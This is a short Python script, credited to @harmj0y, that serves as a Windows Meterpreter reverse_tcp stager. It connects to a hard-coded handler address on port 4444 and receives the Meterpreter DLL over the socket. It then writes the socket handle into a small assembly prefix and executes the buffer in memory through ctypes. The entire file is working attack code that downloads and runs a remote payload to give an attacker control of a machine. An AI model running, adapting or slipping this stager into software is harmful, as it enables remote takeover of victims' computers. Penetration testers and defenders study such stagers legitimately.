#
# Python windows/meterpreter/reverse_tcp stager 
#   (doesn't rely on shellcode)
#
# Original inspiration: https://github.com/rsmudge/metasploit-loader
#
# By: @harmj0y
#

import urllib, struct, socket, binascii
from ctypes import *

# create the socket and connect to the handler
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.30.129", 4444))

# grab the socket number and pack it into the format we need
packedSocketNum = struct.pack('<i', s.fileno())

# read/decode the size of the metepreter payload being transmitted
length = struct.unpack('<i', str(s.recv(4)))[0]

# 5 spaces -> 1 byte for ASM code, 4 byes for socket descriptor (below)
payload = "     "

# make sure we get all of the meterpreter payload
while len(payload) < length:
    payload += s.recv(length)

# stuff the meterpreter .dll into the buffer
buf = create_string_buffer(payload, len(payload))

#prepend a little assembly to move our SOCKET value to the EDI register
#      BF 78 56 34 12     =>      mov edi, 0x12345678
buf[0] = binascii.unhexlify('BF')

# copy in the underlying socket ID into the buffer
for i in xrange(4):
        buf[i+1] = packedSocketNum[i]

# cast our giant buffer as a C void pointer
function = cast(buf, CFUNCTYPE(c_void_p))

# invoke the .dll
function()
